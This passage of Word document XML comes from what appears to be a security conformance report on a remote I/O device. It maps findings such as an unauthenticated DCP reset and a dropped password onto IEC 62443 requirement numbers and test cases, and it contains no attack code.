        <w:t xml:space="preserve"> on the write path; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CRC-forgeability</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (integrity, why a modified record isn't detected) is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005 (TC-RQ005-02)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. The two findings are complementary but scoped to different requirements.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310D81E2" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:pict w14:anchorId="24DEF68D">
          <v:rect id="_x0000_i1758" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3C9756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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-011)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2586AF16" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Confirmed RQ-011 as the correct recipient</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>firmware-update access gate + EoP-via-999</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (deferred from RQ-005) and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthenticated DCP factory-reset</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (flagged in RQ-001). These are authorization matters and are retained here (TS-2, TS-4).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF7A7C0" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scoped-down the learning-phase clause</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — from a mapped/rationale item to a </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>one-line N/A conformance note (SM-5)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> with rationale (no ML/adaptive function). </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t>It</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t>generates</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId295" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49EB3289" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Clarified the DCP boundary with RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — TC-RQ011-02 tests the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> aspect (can an unauthorized node issue the reset?); the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>flooding/availability</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> use of repeated resets is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFE9E0A" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Clarified the fieldbus-write boundary with RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — TC-RQ011-03 tests the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>absence of an authorization credential</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CRC-forgeability (integrity)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005 (TC-RQ005-02)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6901D187" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Retained the correct core</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the pivotal </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>password-dropped</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> finding (SRIO-8299), the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CCSC-2 delegated-authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> framing, the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SRIO-3029 corroboration</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the DCP hypothesis (with "must-test" discipline), and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>param-end write-gate</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId296" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId297" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00D73D4E">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId298" w:history="1">
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00D73D4E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="05D01777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 xml:space="preserve">Corrected verdict, tightly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011 = restrict who may modify safety-relevant settings</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — device-side authorization is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>largely unenforced</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (password dropped; only a physical-presence barrier for F-address/update + param-end write-gate + CRC integrity), so the requirement holds </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>only under the environmental "safe-zone" assumption (CCSC-2)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, with </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>two residual exposures</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthenticated DCP reset (G-2)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>silent physical-barrier defeat (G-4)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — while </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>update signature verification</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DCP flooding</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>learning-phase clause</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>N/A (SM-5)</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B20E788" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:pict w14:anchorId="18A54B47">
          <v:rect id="_x0000_i1759" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="585F01D4" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Full scope-boundary recheck — COMPLETE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD60F69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>Every requirement that shared material has now been rechecked. The corrected, non-overlapping boundary map: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419"/>
        <w:gridCol w:w="4333"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="19379C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1A107A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F6F04A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6D03CD" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Corrected</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>boundary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="1AF83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72956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Identify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978F2" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>RQ-004 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>SW+data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>), RQ-006 (SW)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1B84C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 xml:space="preserve">Completeness + confidentiality; </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>integrity</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-005; </w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>change-count</w:t>
            </w:r>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="691DD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4CEB1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Protect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A3743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RQ-002 (tamper-resist), RQ-005 (integrity/authenticity)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6F2D0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i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Evidence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> → RQ-003; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>authorization</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> → RQ-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="030AD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11D58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Authorize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F9CA0" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>RQ-011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86FEE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Receives update-gate/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>EoP</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + unauthenticated-DCP; learning-phase = N/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="275C5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6DC34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Collect</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E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AA809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RQ-003 (physical), RQ-008 (software), RQ-009 (config)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D3663" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>REVISION_COUNTER/I&amp;M4 in RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w14:paraId="6551C6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B92C0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Retain</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>restrict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9865F" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:lastRenderedPageBreak/>
              <w:t>RQ-012, RQ-013, RQ-014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4D44F" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve">The </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t>audit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:t xml:space="preserve"> paradox</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D73D4E" w:rsidRPr="00483B71" w14:paraId="4F397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54441" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00D73D4E" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Withstand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81C8C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RQ-001 (connecting device), RQ-010 (foreseeable attacks)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C03C6" w14:textId="77777777" w:rsidR="00D73D4E" w:rsidRPr="00483B71" w:rsidRDefault="00D73D4E" w:rsidP="00D73D4E">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00483B71">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Flood/DoS/fuzz in RQ-010; firmware/spoofing cross-referenced</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6BD935EE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 xml:space="preserve">The corrected set converges on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00483B71">
        <w:rPr>
          <w:b/>
